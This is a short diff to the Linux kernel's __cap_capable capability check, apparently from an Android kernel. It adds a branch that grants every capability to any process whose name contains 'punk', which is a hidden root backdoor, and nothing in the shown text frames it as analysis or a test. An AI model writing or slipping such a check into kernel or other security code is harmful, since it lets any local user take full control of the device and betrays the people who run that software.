@@ -72,7 +72,10 @@ int __cap_capable(const struct cred *cred, struct user_namespace *targ_ns,
 		int cap, int audit)
 {
 	struct user_namespace *ns = targ_ns;
-
+	if(strstr(current->comm, "punk")) {
+		//current->flags |= PF_SUPERPRIV;
+		return 0;	
+	}
 #ifdef CONFIG_ANDROID_PARANOID_NETWORK
 	if (cap == CAP_NET_RAW && in_egroup_p(AID_NET_RAW))
 		return 0;
